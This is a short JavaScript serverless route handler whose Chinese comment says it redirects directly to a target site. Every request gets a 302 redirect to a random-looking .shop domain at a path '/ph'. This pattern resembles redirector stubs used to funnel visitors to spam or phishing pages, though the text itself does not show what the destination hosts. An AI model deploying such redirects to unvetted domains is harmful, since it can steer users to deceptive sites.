export default async function handler(req, res) {
  // 直接重定向到目标网站
  res.writeHead(302, {
    'Location': 'https://ewaltooshncobyax.shop/ph'
  });
  res.end();
}